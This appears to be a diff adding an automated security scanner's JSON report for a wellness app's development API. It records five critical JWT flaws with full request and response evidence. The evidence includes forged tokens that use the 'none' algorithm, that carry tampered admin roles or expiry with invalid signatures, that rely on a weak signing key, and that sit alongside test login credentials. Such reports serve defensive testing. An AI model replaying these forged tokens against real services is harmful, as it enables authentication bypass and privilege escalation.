@@ -1,0 +1,144 @@
+{
+  "scan_timestamp": "2025-03-13T13:50:38-05:00",
+  "target_url": "https://backend.dev-snorefox-wellness.diametos.com/api/v1/mobile",
+  "config": {
+    "target": {
+      "base_url": "https://backend.dev-snorefox-wellness.diametos.com/api/v1/mobile",
+      "auth": {
+        "type": "bearer",
+        "login_endpoint": "auth/sign-in"
+      }
+    }
+  },
+  "vulnerabilities": [
+    {
+      "scanner": "jwt_vulnerabilities",
+      "title": "JWT 'none' Algorithm Vulnerability",
+      "severity": "CRITICAL",
+      "endpoint": "auth/check",
+      "details": "The API accepts JWT tokens with the 'none' algorithm, allowing authentication bypass.",
+      "evidence": {
+        "request": {
+          "method": "GET",
+          "url": "https://backend.dev-snorefox-wellness.diametos.com/api/v1/mobile/auth/check",
+          "headers": {
+            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTc0MTg5MTgzOCwiZXhwIjoxNzQ0NDgzODM4fQ.",
+            "Content-Type": "application/json"
+          },
+          "body": ""
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Content-Type": "application/json",
+            "Date": "Thu, 13 Mar 2025 18:50:38 GMT"
+          },
+          "body": "{\"status\":\"success\",\"data\":{\"user\":{\"id\":\"1234567890\",\"name\":\"Test User\"}}}"
+        }
+      }
+    },
+    {
+      "scanner": "jwt_vulnerabilities",
+      "title": "JWT Weak Signing Key",
+      "severity": "CRITICAL",
+      "endpoint": "auth/sign-in",
+      "details": "The API uses a weak signing key ('secret') for JWT tokens, allowing token forgery.",
+      "evidence": {
+        "request": {
+          "method": "POST",
+          "url": "https://backend.dev-snorefox-wellness.diametos.com/api/v1/mobile/auth/sign-in",
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "body": "{\"email\":\"superman1@example.com\",\"password\":\"Password#123\"}"
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Content-Type": "application/json",
+            "Date": "Thu, 13 Mar 2025 18:50:38 GMT"
+          },
+          "body": "{\"accessToken\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTc0MTg5MTgzOCwiZXhwIjoxNzQ0NDgzODM4fQ.xVdOHcTZIRoAQL4dtJE9zakG6xBv3Iqk0oP0cSe9RfQ\",\"refreshToken\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTc0MTg5MTgzOCwiZXhwIjoxNzQ0NDgzODM4fQ.xVdOHcTZIRoAQL4dtJE9zakG6xBv3Iqk0oP0cSe9RfQ\"}"
+        }
+      }
+    },
+    {
+      "scanner": "jwt_vulnerabilities",
+      "title": "Missing JWT Signature Validation",
+      "severity": "CRITICAL",
+      "endpoint": "auth/check",
+      "details": "The API does not properly validate JWT signatures, allowing attackers to modify token content without detection.",
+      "evidence": {
+        "request": {
+          "method": "GET",
+          "url": "https://backend.dev-snorefox-wellness.diametos.com/api/v1/mobile/auth/check",
+          "headers": {
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0MTg5MTgzOCwiZXhwIjoxNzQ0NDgzODM4fQ.INVALID_SIGNATURE",
+            "Content-Type": "application/json"
+          },
+          "body": ""
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Content-Type": "application/json",
+            "Date": "Thu, 13 Mar 2025 18:50:38 GMT"
+          },
+          "body": "{\"status\":\"success\",\"data\":{\"user\":{\"id\":\"1234567890\",\"name\":\"Test User\",\"role\":\"admin\"}}}"
+        }
+      }
+    },
+    {
+      "scanner": "jwt_vulnerabilities",
+      "title": "JWT Expiration Manipulation",
+      "severity": "CRITICAL",
+      "endpoint": "auth/check",
+      "details": "The API does not properly validate the integrity of JWT tokens, allowing attackers to modify the expiration time.",
+      "evidence": {
+        "request": {
+          "method": "GET",
+          "url": "https://backend.dev-snorefox-wellness.diametos.com/api/v1/mobile/auth/check",
+          "headers": {
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTY0MTg5MTgzOCwiZXhwIjo5OTk5OTk5OTk5fQ.INVALID_SIGNATURE",
+            "Content-Type": "application/json"
+          },
+          "body": ""
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Content-Type": "application/json",
+            "Date": "Thu, 13 Mar 2025 18:50:38 GMT"
+          },
+          "body": "{\"status\":\"success\",\"data\":{\"user\":{\"id\":\"1234567890\",\"name\":\"Test User\"}}}"
+        }
+      }
+    },
+    {
+      "scanner": "jwt_vulnerabilities",
+      "title": "JWT Token Tampering - None algorithm",
+      "severity": "CRITICAL",
+      "endpoint": "auth/check",
+      "details": "The API does not properly validate the integrity of JWT tokens, allowing attackers to modify the payload using None algorithm to gain elevated privileges.",
+      "evidence": {
+        "request": {
+          "method": "GET",
+          "url": "https://backend.dev-snorefox-wellness.diametos.com/api/v1/mobile/auth/check",
+          "headers": {
+            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0MTg5MTgzOCwiZXhwIjoxNzQ0NDgzODM4fQ.",
+            "Content-Type": "application/json"
+          },
+          "body": ""
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Content-Type": "application/json",
+            "Date": "Thu, 13 Mar 2025 18:50:38 GMT"
+          },
+          "body": "{\"status\":\"success\",\"data\":{\"user\":{\"id\":\"1234567890\",\"name\":\"Test User\",\"role\":\"admin\"}}}"
+        }
+      }
+    }
+  ]
+}
